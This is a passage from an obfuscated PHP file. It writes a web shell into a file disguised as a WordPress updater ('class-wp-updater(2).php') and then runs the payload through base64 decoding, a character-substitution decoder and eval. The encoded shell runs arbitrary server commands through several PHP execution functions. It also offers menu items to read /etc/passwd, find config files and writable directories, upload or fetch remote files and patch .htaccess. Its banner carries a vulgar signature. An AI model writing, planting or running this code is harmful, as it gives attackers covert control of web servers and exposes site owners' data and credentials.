9mMnJtLWQxdDEiPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9ImQ0ciIgdjFsMzU9IicuJGQ0ci4nIj48L3RkPg0KPHRkIHN0eWw1PSJ3NGR0aDogNjAwJTsiPjxzcDFuIHN0eWw1PSJmMm50LXM0ejU6IDlweDsiPicuJGNoZC4nPC9zcDFuPiA8L3RkPjwvdHI+DQo8dHI+PHRkIHN0eWw1PSJ0NXh0LTFsNGduOiBsNWZ0Ij48NG5wM3QgdHlwNT0idDV4dCIgbjFtNT0iY21kIiB2MWwzNT0iJy5AaHRtbHNwNWM0MWxjaDFycyhAJGNtZCxFTlRfUVVPVEVTKS4nIj48L3RkPg0KPHRkIHN0eWw1PSJ3NGR0aDogNjAwJTsiPjw0bnAzdCA0ZD0icjV0M3JuIiB0eXA1PSJzM2JtNHQiIG4xbTU9Ik1RQyIgdjFsMzU9IkV4NWMzdDUiPjwvdGQ+PC90cj4NCjx0cj48dGQgc3R5bDU9InQ1eHQtMWw0Z246IGw1ZnQ7IHAxZGQ0bmc6IDAgdXB4OyI+JnIxcTMyOyBTNWw1Y3QgdDIgM3M1IHQ1eHQgMXI1MTwvdGQ+DQo8dGQgc3R5bDU9Inc0ZHRoOiA2MDAlOyI+PDRucDN0IHR5cDU9ImNoNWNrYjJ4IiBuMW01PSJ0eHQiIHYxbDM1ID0idHh0IicpOw0KNGYoQCRfUE9TVFsndHh0J109PSJ0eHQiKSBwcjRudCgiIGNoNWNrNWQiKTsNCnByNG50KCc+PC90ZD48L3RyPg0KPHRyPjx0ZCBzdHlsNT0idDV4dC0xbDRnbjogbDVmdCI+DQo8czVsNWN0IG4xbTU9ImMybSI+DQo8MnB0NDJuIHM1bDVjdDVkPSJzNWw1Y3Q1ZCIgdjFsMzU9ImxzIC0xIj49PT0gUTM0Y2sgQzJtbTFuZHMgPT09PC8ycHQ0Mm4+DQo8MnB0NDJuIHYxbDM1PSJjMXQgLzV0Yy9wMXNzd2QiPlI1MWQgNXRjIHAxc3N3ZDwvMnB0NDJuPg0KPDJwdDQybiB2MWwzNT0iL3NiNG4vNGZjMm5mNGcgfCBncjVwIDRuNXQiPkw0c3QgSVAgczVydjVyPC8ycHQ0Mm4+DQo8MnB0NDJuIHYxbDM1PSJoMnN0IC00ICcuQCRfU0VSVkVSWyJIVFRQX0hPU1QiXS4nIj5TaDJ3IEROUyBkMm0xNG48LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9Imgyc3QgLTQgJy5AZzV0aDJzdGJ5bjFtNSgkX1NFUlZFUlsiSFRUUF9IT1NUIl0pLiciPlNoMncgRE5TIGJ5IGgyc3Q8LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9InBzIHgiPkw0c3QgcHIyY2M1c3M8LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9ImNyMm50MWIgLWwiPkw0c3QgY3IybnQxYjwvMnB0NDJuPg0KPDJwdDQybiB2MWwzNT0iZjRuZCAnLiRkNHIuJyAtdHlwNSBmIC1uMW01ICpjMm5mNGcqLnBocCI+RjRuZCBjMm5mNGcgZjRsNXM8LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9ImY0bmQgJy4kZDRyLicgLXR5cDUgZCAtcDVybSAtYSB8IGdyNXAgLXYgZDVuNDVkIj5GNG5kIHdyNHQxYmw1IGQ0cjwvMnB0NDJuPg0KPDJwdDQybiB2MWwzNT0iM3B0NG01Ij5VcHQ0bTUgczVydjVyPC8ycHQ0Mm4+DQo8MnB0NDJuIHYxbDM1PSJuNXRzdDF0IC0xbiB8IGdyNXAgLTQgbDRzdDVuIj5TaDJ3IDJwNW41ZCBwMnJ0czwvMnB0NDJuPg0KPC9zNWw1Y3Q+PC90ZD4NCjx0ZCBzdHlsNT0idzRkdGg6IDYwMCU7Ij48NG5wM3QgNGQ9InI1dDNybiIgdHlwNT0iczNibTR0IiBuMW01PSJxMzRjayIgdjFsMzU9IlEzNGNrIj48L3RkPjwvdHI+DQo8dHI+PHRkIHN0eWw1PSJ0NXh0LTFsNGduOiBsNWZ0Ij4NCjxzNWw1Y3QgbjFtNT0iYzJ4Ij4NCjwycHQ0Mm4gZDRzMWJsNWQ9ImQ0czFibDVkIiBzNWw1Y3Q1ZD0iczVsNWN0NWQiIHYxbDM1PSIiPj09PSBRMzRjayBDaDFuZzVzID09PTwvMnB0NDJuPg0KPDJwdDQybiB2MWwzNT0iaHQxIj5QMXRjaCAuaHQxY2M1c3M8LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9InBocCI+UDF0Y2ggcGhwLjRuNDwvMnB0NDJuPg0KPDJwdDQybiB2MWwzNT0iZDVuIj5GMnJiNGQgZDRyNWN0MnJ5PC8ycHQ0Mm4+DQo8MnB0NDJuIHYxbDM1PSIyY3giPkYycmM1IGQyd25sMjFkPC8ycHQ0Mm4+DQo8MnB0NDJuIHYxbDM1PSJyNW0iPlI1bTJ2NSBNUSBzaDVsbDwvMnB0NDJuPg0KPC9zNWw1Y3Q+PC90ZD4NCjx0ZCBzdHlsNT0idzRkdGg6IDYwMCU7Ij48NG5wM3QgNGQ9InI1dDNybiIgdHlwNT0iczNibTR0IiBuMW01PSJieXAxenoiIHYxbDM1PSJDaDFuZzUiPjwvdGQ+PC90cj4NCjx0cj48dGQgc3R5bDU9InQ1eHQtMWw0Z246IGw1ZnQiPg0KPDRucDN0IHR5cDU9ImY0bDUiIG4xbTU9ImY0bDUiPg0KPHRkIHN0eWw1PSJ3NGR0aDogNjAwJTsiPjw0bnAzdCA0ZD0icjV0M3JuIiB0eXA1PSJzM2JtNHQiIG4xbTU9IjNwbDIxZCIgdjFsMzU9IlVwbDIxZCI+PC90ZD48L3RyPg0KPHRyPjx0ZCBzdHlsNT0idDV4dC0xbDRnbjogbDVmdCI+DQo8NG5wM3QgdHlwNT0idDV4dCIgbjFtNT0ic3JjIiB2MWwzNT0iaHR0cDovL3I1bTJ0NWgyc3QgPT4gbjV3X24xbTUiPg0KPHRkIHN0eWw1PSJ3NGR0aDogNjAwJTsiPjw0bnAzdCA0ZD0icjV0M3JuIiB0eXA1PSJzM2JtNHQiIG4xbTU9IjRtcDJydCIgdjFsMzU9IkltcDJydCI+PC90ZD48L3RyPg0KPHRyPjx0ZCBzdHlsNT0idDV4dC0xbDRnbjogbDVmdCI+PC9mMnJtPg0KPGYycm0gbTV0aDJkPSJnNXQiPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9ImRsIiB2MWwzNT0iJy4kZDRyLiciPjwvdGQ+DQo8dGQgc3R5bDU9Inc0ZHRoOiA2MDAlOyI+PDRucDN0IDRkPSJyNXQzcm4iIHR5cDU9InMzYm00dCIgdjFsMzU9IkV4cDJydCI+PC9mMnJtPjwvdGQ+PC90cj4NCjwvdDFibDU+PC9kNHY+Jyk7DQpwcjRudChAczNwcDJydCgpKTsNCnByNG50KEBrMWs0azMoKSk7DQoNCiMjI1sgRlVOQ1RJT05aIF0jIyMNCmYzbmN0NDJuIGQyd25sMjFkKCRtNSl7DQo0ZihAc3Ryc3RyKCRtNSwiLyIpKXsNCiRuMW01PUBzdHJyY2hyKCRtNSwiLyIpOw0KJG4xbTU9QHN0cl9yNXBsMWM1KCIvIiwiIiwkbjFtNSk7DQp9DQo1bHM1NGYoQHN0cnN0cigkbTUsIlxcIikpew0KJG4xbTU9QHN0cnJjaHIoJG01LCJcXCIpOw0KJG4xbTU9QHN0cl9yNXBsMWM1KCJcXCIsIiIsJG4xbTUpOw0KfQ0KJG4xbTU9QDNybGQ1YzJkNSgkbjFtNSk7DQpoNTFkNXIoIlByMWdtMTogcDNibDRjIik7DQpoNTFkNXIoIkV4cDRyNXM6IDAiKTsNCmg1MWQ1cigiQzFjaDUtQzJudHIybDogbTNzdC1yNXYxbDRkMXQ1LCBwMnN0LWNoNWNrPTAsIHByNS1jaDVjaz0wIik7DQpoNTFkNXIoIkMxY2g1LUMybnRyMmw6IHByNHYxdDUiLCBmMWxzNSk7DQpoNTFkNXIoIkMybnQ1bnQtRDRzcDJzNHQ0Mm46IDF0dDFjaG01bnQ7IGY0bDVuMW01PSIuJG4xbTUpOw0KaDUxZDVyKCJDMm50NW50LVR5cDU6IDFwcGw0YzF0NDJuL2YycmM1LWQyd25sMjFkIik7DQpoNTFkNXIoIkMybnQ1bnQtTDVuZ3RoOiAiLkBmNGw1czR6NSgkbTUpKTsNCmg1MWQ1cigiQzJudDVudC1UcjFuc2Y1ci1FbmMyZDRuZzogYjRuMXJ5Iik7DQpyNTFkZjRsNSgkbTUpOyA1eDR0KCk7DQp9DQpmM25jdDQybiBnNXRwd2QoJGQ0cil7DQo0ZigkcD1zdHJycDJzKCRkNHIsIi8iKSl7DQo0ZigkcCE9c3RybDVuKCRkNHIpLTYpew0KJGQ9JGQ0ci4iLyI7fQ0KNWxzNXskZD0kZDRyO30NCn0NCjVsczU0ZigkcD1zdHJycDJzKCRkNHIsIlxcIikpew0KNGYoJHAhPXN0cmw1bigkZDRyKS02KXsNCiRkPSRkNHIuIlxcIjt9DQo1bHM1eyRkPSRkNHI7fQ0KfQ0KNWxzNXskZD0kZDRyLkRJUkVDVE9SWV9TRVBBUkFUT1I7fQ0KcjV0M3JuIEBzdHI0cHA1cigkZCk7DQp9DQpmM25jdDQybiBzdHI0cHA1cigkMXJncyl7DQokMXJncz1AcHI1Z19yNXBsMWM1KCIvXC8rLyIsIi8iLCQxcmdzKTsNCiQxcmdzPUBwcjVnX3I1cGwxYzUoIi9cXFwrLyIsIlxcIiwkMXJncyk7DQpyNXQzcm4gJDFyZ3M7DQp9DQpmM25jdDQybiBzM3BwMnJ0KCl7DQokYzJiND0iIjsNCiRjMmIxPUBNUUMoIndoNGNoIHdnNXQgczIzcmM1IGx5bnggZjV0Y2ggYzNybCBsd3AtZDJ3bmwyMWQgZ2NjIGMrKyBnKysgejRwIHA1cmwgcHl0aDJuIG15c3FsIGwyYzF0NSIpOw0KNGYoJGMyYjE9PSJFUlJPUiIgT1IgJGMyYjE9PSJFT0YiKQ0KcHI0bnQoJzxkNHYgNGQ9IjRuZjIiPjxkNHYgNGQ9IjVycjJyIj5DMW4gbjJ0IGwyYzF0NSB3aDRjaDwvZDR2PjwvZDR2PicpOw0KNGYoQHByNWdfbTF0Y2goIi9cLy8iLCRjMmIxKSl7DQokNXg9QDV4cGwyZDUoIlxuIiwkYzJiMSk7DQpmMnI1MWNoICgkNXggMXMgJHggPT4gJG4xbTUpew0KNGYoIUA1cjVnNCgid2g0Y2g6IG4yIiwkbjFtNSkpew0KJG4xbTU9QHN0cnJjaHIoJG4xbTUsIi8iKTsNCiRuMW01PXN0cl9yNXBsMWM1KCIvIiwiIiwkbjFtNSk7DQokbjFtNT1zdHJfcjVwbDFjNSgiLWQyd25sMjFkIiwiIiwkbjFtNSk7DQokbjFtNT1zdHJfcjVwbDFjNSgiYysrIiwiYzJtcDRsNXJfYyIsJG4xbTUpOw0KJG4xbTU9c3RyX3I1cGwxYzUoImcrKyIsImMybXA0bDVyX2ciLCRuMW01KTsNCiRjMmI0IC49ICIkbjFtNSAiOw0KfQ0KfQ0KNGYoQDRzX2Y0bDUoIi9sNGIvbGQtbDRuM3guczIuYSIpKQ0KJGMyYjQgLj0gImxkLWw0bjN4LnMyLmEgIjsNCjRmKEA0c19mNGw1KCIvbDRiL2w0YnouczIuNiIpKQ0KJGMyYjQgLj0gImw0YnouczIuNiI7DQpwcjRudCgnPGQ0diA0ZD0iNG5mMiI+PGQ0diA0ZD0icjVzM2x0IiBzdHlsNT0idDV4dC0xbDRnbjogYzVudDVyOyI+Jy4kYzJiNC4nPC9kNHY+PC9kNHY+Jyk7DQp9DQp9DQpmM25jdDQybiBnNXR0NHRsNSgpew0KNGYoQHBocF8zbjFtNSgpIE9SIEBmM25jdDQybl81eDRzdHMoInBocF8zbjFtNSIpKQ0KJDNuMW01PUBwaHBfM24xbTUoJ24nKS4iICIuQHBocF8zbjFtNSgncicpLiIgIi5AcGhwXzNuMW01KCd2Jyk7DQo1bHM1ICQzbjFtNT1ATVFDKCIzbjFtNSAtbnJ2Iik7DQpyNXQzcm4gQG0yZDV6KCkuIiAtICIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIgLSAkM24xbTUiOw0KfQ0KZjNuY3Q0Mm4gbTJkNXooKXsNCjRmKEA0bjRfZzV0KCJzMWY1X20yZDUiKSBPUiA1cjVnNCgiMm4iLEA0bjRfZzV0KCJzMWY1X20yZDUiKSkpIHI1dDNybiAnT04nOw0KNWxzNSByNXQzcm4gJ09GRic7DQp9DQpmM25jdDQybiBkNHNmM25jKCl7DQo0ZigkZDR6PUA0bjRfZzV0KCJkNHMxYmw1X2YzbmN0NDJucyIpKXsNCiRyNXo9c3RyX3I1cGwxYzUoJywnLCcsICcsc3RyX3I1cGwxYzUoJyAnLCIiLCRkNHopKTsNCnI1dDNybiAnPGQ0diA0ZD0iNG5mMiI+PGQ0diA0ZD0iNXJyMnIiPicuJHI1ei4nPC9kNHY+PC9kNHY+JzsNCn0NCn0NCmYzbmN0NDJuIGc1dGYzbmMoKXsNCiRkNHNmM25jPUA0bjRfZzV0KCJkNHMxYmw1X2YzbmN0NDJucyIpOw0KNGYoIUA1bXB0eSgkZDRzZjNuYykpew0KJGQ0c2YzbmM9c3RyX3I1cGwxYzUoIiAiLCIiLCRkNHNmM25jKTsNCiRkNHNmM25jPTV4cGwyZDUoIiwiLCRkNHNmM25jKTsNCn0gNWxzNSB7ICRkNHNmM25jPTFycjF5KCk7IH0NCnI1dDNybiAkZDRzZjNuYzsNCn0NCmYzbmN0NDJuIDVuMWJsNWQoJGYzbmMpew0KNGYoQDRzX2MxbGwxYmw1KCRmM25jKSBBTkQgITRuXzFycjF5KCRmM25jLGc1dGYzbmMoKSkpIHI1dDNybiB0cjM1Ow0KNWxzNSByNXQzcm4gZjFsczU7DQp9DQpmM25jdDQybiBNUUMoJGNtZCl7DQokaDFzNGw9IiI7DQo0Zig1bjFibDVkKCJwMnA1biIpKXsNCiRoPUBwMnA1bigkY21kLicgYT4mNicsICdyJyk7DQo0ZihANHNfcjVzMjNyYzUoJGgpKXsNCndoNGw1ICghZjUyZigkaCkpeyAkaDFzNGwgLj0gZnI1MWQoJGgsIGEwOWUpOyAgfQ0KQHBjbDJzNSgkaCk7IH0NCn0gNWxzNTRmKDVuMWJsNWQoInAxc3N0aHIzIikpew0KQDJiX3N0MXJ0KCk7IHAxc3N0aHIzKCRjbWQpOw0KJGgxczRsPUAyYl9nNXRfYzJudDVudHMoKTsNCkAyYl81bmRfY2w1MW4oKTsNCn0gNWxzNTRmKDVuMWJsNWQoInNoNWxsXzV4NWMiKSl7DQokaDFzNGw9QHNoNWxsXzV4NWMoJGNtZCk7DQp9IDVsczU0Zig1bjFibDVkKCI1eDVjIikpew0KQDV4NWMoJGNtZCwkMik7DQokaDFzNGw9ajI0bigiXHJcbiIsJDIpOw0KfSA1bHM1NGYoNW4xYmw1ZCgic3lzdDVtIikpew0KQDJiX3N0MXJ0KCk7DQpAc3lzdDVtKCRjbWQpOw0KJGgxczRsPUAyYl9nNXRfYzJudDVudHMoKTsNCkAyYl81bmRfY2w1MW4oKTsNCn0gNWxzNTRmKDV4dDVuczQybl9sMjFkNWQoJ3A1cmwnKSl7DQokaDFzNGw9QHA1cmxzaDVsbCgkY21kKTsNCn0gNWxzNTRmKDV4dDVuczQybl9sMjFkNWQoJ3B5dGgybicpKXsNCiRoMXM0bD1AcHl0aDJuXzV2MWwoIjRtcDJydCAycw0KMnMuc3lzdDVtKCciLiRjbWQuIicpIik7DQp9IDVsczUgeyAkaDFzNGw9IkVSUk9SIjsgfQ0KNGYoJGgxczRsPT0iIikgJGgxczRsPSJFT0YiOw0KcjV0M3JuIHRyNG0oJGgxczRsKTsNCn0NCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjWyBETEMgU0hFTEwgQlkgRElDS1MgTE9PS0lORyBGT1IgQ1VOVFMgXSMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KNXg0dDs=";@eval(@base64_decode("JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=="));exit;');
}
if($bypass == true){


	// unobfuscated to class-wp-updater(2).php
@fwrite($bypass,'<?php $_F=__FILE__;$_X="Pz48P3BocA0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIyMgR09PR0xFIEJZUEFTUyBCWSBNQVFJRSAjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQo1Y2gyICc8aHRtbD48aDUxZD4NCjx0NHRsNT5NUSAtICcuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicgLSBHMjJnbDUgQnlwMXNzPC90NHRsNT4NCjwhLS0gUDJ3NXI1ZCBieSBNMXE0NWM0MjNzIC8vLS0+DQo8bTV0MSBuMW01PSJyMmIydHMiIGMybnQ1bnQ9Im4yNG5kNXgsIG4yZjJsbDJ3Ij4NCjxzdHlsNSB0eXA1PSJ0NXh0L2NzcyIgbTVkNDE9ImgxbmRoNWxkLCAxbGwiPg0KPCEtLSBiMmR5IHsgYjFja2dyMjNuZC1jMmwycjogI2FhYTsgYzJsMnI6ICNkZGQ7IG0xcmc0bjogMTN0MjsgZjJudDogbjJybTFsIG4ycm0xbCA2NnB4IEg1bHY1dDRjMSwgQXI0MWwsIHMxbnMtczVyNGY7IGg1NGdodDogNjAwJTsgdzRkdGg6IDYwMCU7IH0NCi5sMmcyIHsgYjFja2dyMjNuZC1jMmwycjojNTU1OyBjMmwycjogI291b3VvdTsgYjJyZDVyOiBhcHggczJsNGQgI2JiYjsgbTFyZzRuOiBhcHg7IHQ1eHQtMWw0Z246IGM1bnQ1cjsgZjJudC13NTRnaHQ6IGIybGQ7IHAxZGQ0bmc6IHVweDsgfQ0KdDFibDUgeyB0MWJsNS1sMXkyM3Q6IGY0eDVkOyB9DQoudDFibDUsIC40bmYyIHsgYjFja2dyMjNuZC1jMmwycjogI291b3VvdTsgYjJyZDVyOiA2cHggczJsNGQgIzAwMDsgbTFyZzRuOiBhcHg7IHAxZGQ0bmc6IGFweDsgfQ0KLnI1eiB7IGIxY2tncjIzbmQtYzJsMnI6ICNlZTFvZG87IGMybDJyOiAjMDAwOyBiMnJkNXI6IDZweCBzMmw0ZCAjYWFhOyBtMXJnNG46IGFweDsgcDFkZDRuZzogb3B4OyB9DQouNXg0c3QgeyBiMWNrZ3IyM25kLWMybDJyOiAjaWVpZWllOyBjMmwycjogI2RkZDsgYjJyZDVyOiA2cHggczJsNGQgI2FhYTsgdDV4dC0xbDRnbjogYzVudDVyOyBtMXJnNG46IGFweDsgcDFkZDRuZzogb3B4OyB9DQouaDFzNGwgeyBiMWNrZ3IyM25kLWMybDJyOiAjNTU1OyBjMmwycjogI291b3VvdTsgdDV4dC0xbDRnbjogYzVudDVyOyBiMnJkNXI6IDZweCBzMmw0ZCAjYmJiOyBiMnJkNXItYjJ0dDJtOiBuMm41OyBtMXJnNG46IDBweCBhcHg7IHAxZGQ0bmc6IGFweDsgfQ0KdGQgeyBiMWNrZ3IyM25kLWMybDJyOiN1aXVpdWk7IGMybDJyOiAjZGRkOyBmMm50OiBuMnJtMWwgbjJybTFsIDY2cHggSDVsdjV0NGMxLCBBcjQxbCwgczFucy1zNXI0ZjsgYjJyZDVyOjZweCBzMmw0ZCAjaWlpOyBtMXJnNG46IGFweDsgdDV4dC0xbDRnbjogYzVudDVyOyB9DQo0bnAzdCwgczVsNWN0LCAycHQ0Mm4geyBiMWNrZ3IyM25kLWMybDJyOiNvb287IGMybDJyOiAjZGRkOyBmMm50OiBuMnJtMWwgbjJybTFsIDY2cHggSDVsdjV0NGMxLCBBcjQxbCwgczFucy1zNXI0ZjsgYjJyZDVyOiA2cHggczJsNGQgI2FhYTsgbTFyZzRuOiBhcHg7IH0NCjRucDN0W3R5cDU9InQ1eHQiXSwgNG5wM3RbdHlwNT0iZjRsNSJdLCBzNWw1Y3QsIDJwdDQybiB7IHc0ZHRoOiA2dTBweDsgfQ0KNG5wM3RbdHlwNT0iczNibTR0Il0geyB3NGR0aDogaTBweDsgfQ0KLnI1dDNybiB7IGIxY2tncjIzbmQtYzJsMnI6ICNlZTFvZG87IGMybDJyOiAjMDAwOyB9DQoucjV0M3JuOmgydjVyIHsgYjFja2dyMjNuZC1jMmwycjogI2FhYTsgYzJsMnI6ICM1NTU7IH0NCjEgeyBjMmwycjogI2JiMDAwMDsgfQ0KMTpoMnY1ciB7IGMybDJyOiAjMDAwMGJiOyB9DQp0NXh0MXI1MSB7IHc0ZHRoOiA5OCU7IGIxY2tncjIzbmQtYzJsMnI6ICN1aXVpdWk7IGMybDJyOiAjZGRkOyBmMm50OiBuMnJtMWwgbjJybTFsIDY2cHggSDVsdjV0NGMxLCBBcjQxbCwgczFucy1zNXI0ZjsgYjJyZDVyOiA2cHggczJsNGQgI2lpaTsgbTFyZzRuOiBhcHg7IHAxZGQ0bmc6IGFweDsgfSAvLy0tPjwvc3R5bDU+DQo8L2g1MWQ+PGIyZHk+DQo8ZDR2IHN0eWw1PSJtMXJnNG46IGEgMTN0MjsgbTF4LXc0ZHRoOiBhYTBweDsiPg0KPGQ0diBjbDFzcz0ibDJnMiI+R09PR0xFIEJZUEFTUzwvZDR2Pic7DQoNCiRxID0gJF9HRVRbJ3EnXTsNCiRtID0gJF9HRVRbJ20nXTsgJG0gPSAoNW1wdHkoJG0pKSA/IGUwIDogJG07DQokZCA9ICRfR0VUWydkJ107ICRkID0gKDVtcHR5KCRkKSkgPyAiYzJtIiA6ICRkOw0KNGYgKCE1bXB0eSgkcSkpIHsNCiRxID0gc3RyNHBzbDFzaDVzKCRxKTsNCiRoMXM0bCA9IGcyMmdsNG5nKCRxLCRtLCRkKTsNCjVjaDIgJzxkNHYgY2wxc3M9IjRuZjIiPjxkNHYgY2wxc3M9IjRuZjIiIHN0eWw1PSJiMWNrZ3IyM25kLWMybDJyOiAjOTAwOyB0NXh0LTFsNGduOiBjNW50NXI7IGYybnQtdzU0Z2h0OiBiMmxkOyBjMmwycjogI2RkZDsiPiIgJy4kcS4nICI8L2Q0dj48L2Q0dj4nOw0KNWNoMiAnPGQ0diBjbDFzcz0iNG5mMiI+JzsNCjVjaDIgJGgxczRsOw0KNWNoMiAnPC9kNHY+JzsNCn0NCjVjaDIgJzxmMnJtIG01dGgyZD0iR0VUIj4NCjxkNHYgY2wxc3M9InQxYmw1Ij4NCjx0MWJsNSBiMnJkNXI9IjAiIGM1bGxzcDFjNG5nPSI2Ij4NCjx0cj48dGQgc3R5bDU9InQ1eHQtMWw0Z246IGw1ZnQiPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9InEiIHYxbDM1PSInLmh0bWw1bnQ0dDQ1cygkcSkuJyI+DQo8L3RkPjx0ZCBzdHlsNT0idzRkdGg6IDYwMCU7Ij4NCjw0bnAzdCBjbDFzcz0icjV0M3JuIiB0eXA1PSJzM2JtNHQiIHYxbDM1PSJTRUFSQ0giPg0KPC90ZD48L3RyPg0KPHRyPjx0ZCBzdHlsNT0idDV4dC0xbDRnbjogbDVmdCI+DQo8NG5wM3QgdHlwNT0idDV4dCIgbjFtNT0ibSIgdjFsMzU9IicuJG0uJyIgc3R5bDU9Inc0ZHRoOiBvaXB4OyI+ICZyMXEzMjsgTTF4IG4zbWI1cg0KPGJyPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9ImQiIHYxbDM1PSInLiRkLiciIHN0eWw1PSJ3NGR0aDogb2lweDsiPiAmcjFxMzI7IEQybTE0biBuMW01DQo8L3RkPjx0ZCBzdHlsNT0idzRkdGg6IDYwMCU7Ij4NCk9wdDQybnMNCjwvdGQ+PC90cj48L3QxYmw1Pg0KPC9kNHY+PC9mMnJtPg0KPGQ0diBjbDFzcz0ibDJnMiI+TUFRSUVDSU9VUyAtIERMQyBDWUJFUjwvZDR2Pg0KPC9kNHY+PC9iMmR5PjwvaHRtbD4nOw0KDQpmM25jdDQybiBnMjJnbDRuZygkazV5LCRtMXgsJGQybSkgew0KJGs1eSA9IDNybDVuYzJkNSgkazV5KTsNCiRuM20gPSA2MDA7DQokYmhzID0gJGQybTsNCjRmKEBzdHJwMnMoJGQybSwiLiIpKXsNCiQ1eHQgPSA1eHBsMmQ1KCIuIiwkZDJtKTsNCiRiaHMgPSAkNXh0WzZdOw0KfQ0KZjJyKCRwPTA7JHA8PW8wMDA7JHArPSRuM20pIHsNCiRyNXogPSBodHRwcTM1cnkoImh0dHA6Ly93d3cuZzIyZ2w1LiIuJGQybS4iL3M1MXJjaD9xPSIuJGs1eS4iJm4zbT0iLiRuM20uIiZobD0iLiRiaHMuIiZmNGx0NXI9MCZzdDFydD0iLiRwLDApOw0KJHAxdHQ1cm4gPSAnIzxobyBjbDFzcz1cInJcIj48MSBocjVmPVwiXC8zcmxcP3E9aHR0cDpcL1wvKFteIl0qKSYxbXA7czE9IzQnOw0KJGMyM250ID0gcHI1Z19tMXRjaF8xbGwoJHAxdHQ1cm4sICRyNXosICRtMXRjaDVzLCBQUkVHX1NFVF9PUkRFUik7DQo0ZiAoJGMyM250ID09IDApIHsgcjV0M3JuICRoOyB9DQo1bHM1IHsNCiRqbWxoID0gNjsNCmYyciAoJDQgPSAwOyQ0IDwgJGMyM250OyQ0KyspIHsNCiQzcmx6ID0gM3JsZDVjMmQ1KCRtMXRjaDVzWyQ0XVs2XSk7DQo0ZihANXI1ZzQoInc1YmMxY2g1LmcyMmdsNSIsJDNybHopKSB7DQokM3JseiA9IG0xbjEoJDNybHosIjpodHRwOi8vIiwiJWFCIik7DQp9DQokaCAuPSAnPGQ0diBjbDFzcz0iaDFzNGwiIHN0eWw1PSJ0NXh0LTFsNGduOiBsNWZ0OyAydjVyZmwydzogMTN0MjsiPicuQHN0cnQyM3BwNXIoJGJocykuJyA8MSBocjVmPSJodHRwOi8vJy4kM3Jsei4nIj4nLiQzcmx6Lic8LzE+PC9kNHY+JzsNCiRqbWxoKys7DQokYysrOyA0ZiAoJGMgPj0gJG0xeCkgeyByNXQzcm4gJGg7IH0NCn0NCn0NCn0NCnI1dDNybiAkaDsNCn0NCiMjI1sgRlVOQ1RJT04gUkVRVUlSRUQgXSMjIw0KZjNuY3Q0Mm4gbTFuMSgkYzJudDVudCwkc3QxcnQsJDVuZCl7DQo0ZigkYzJudDVudCAmJiAkc3QxcnQgJiYgJDVuZCl7DQokcj01eHBsMmQ1KCRzdDFydCwkYzJudDVudCk7DQo0Zig0c3M1dCgkcls2XSkpew0KJHI9NXhwbDJkNSgkNW5kLCRyWzZdKTsNCnI1dDNybiAkclswXTsNCn0NCnI1dDNybiBuM2xsOw0KfQ0KfQ0KZjNuY3Q0Mm4gaHR0cHEzNXJ5KCQzcmwsICQxZzVudCl7DQokaDFzNGwgPSBOVUxMOw0KNGYoJDFnNW50ID09IDApew0KJG0yZDUgPSAiTTJ6NGxsMS9pLjAgKFc0bmQyd3M7IFU7IFc0bmQyd3MgTlQgaS42OyA1bi1VUzsgcnY6Ni44LjYpIEc1Y2syL2EwMGUwOTY4IEY0cjVmMngvYS4wIjsNCn0gNWxzNTRmKCQxZzVudCA9PSA2KSB7DQokbTJkNSA9ICJPcDVyMS85LjgwIChKYU1FL01JRFA7IE9wNXIxIE00bjQvdS5vLmF1YTZ1L2F1LjhvODsgVTsgNW4pIFByNXN0Mi9hLmkuYWkgVjVyczQybi82MC5pdSI7DQp9IDVsczUgeyAkbTJkNSA9ICRtMmI0bDU7IH0NCjRmKEBmM25jdDQybl81eDRzdHMoImZzMmNrMnA1biIpKXsNCiQ1eHRyMWN0ID0gNXhwbDJkNSgiLyIsJDNybCk7DQokaDJzdCA9ICQ1eHRyMWN0W2FdOw0KJGoyNG4zcmwgPSAiLyIuajI0bigiLyIsMXJyMXlfc2w0YzUoJDV4dHIxY3QsbykpOw0KJHAycnQgPSA4MDsNCiRiM2sxID0gQGZzMmNrMnA1bigkaDJzdCwkcDJydCwkNXJybjIsJDVycnN0ciw2MCk7DQo0ZigkYjNrMSkgew0KJGs1cDFsMSA9ICIiLg0KICAgIkdFVCAkajI0bjNybCBIVFRQLzYuNlxyXG4iLg0KICAgIkgyc3Q6ICRoMnN0XHJcbiIuDQogICAiQWNjNXB0OiAqKlxyXG4iLg0KICAgIlVzNXItQWc1bnQ6ICRtMmQ1XHJcbiIuDQogICAiQzFjaDUtQzJudHIybDogbjItYzFjaDVcclxuIi4NCiAgICJQcjFnbTE6IG4yLWMxY2g1XHJcbiIuDQogICAiUHIyeHktQzJubjVjdDQybjogSzU1cC1BbDR2NVxyXG4iLg0KICAgIkMybm41Y3Q0Mm46IENsMnM1XHJcblxyXG4iOw0KQGZwM3RzKCRiM2sxLCRrNXAxbDEpOw0Kd2g0bDUoIWY1MmYoJGIzazEpKSB7DQokaDFzNGwgLj0gQGZnNXRzKCRiM2sxLCA2YTgpOw0KfQ0KQGZjbDJzNSgkYjNrMSk7DQp9DQpyNXQzcm4gJGgxczRsOw0KfSA1bHM1NGYoQGYzbmN0NDJuXzV4NHN0cygiYzNybF80bjR0Iikpew0KJGNoID0gYzNybF80bjR0KCk7DQpjM3JsX3M1dDJwdCgkY2gsIENVUkxPUFRfVVJMLCAkM3JsKTs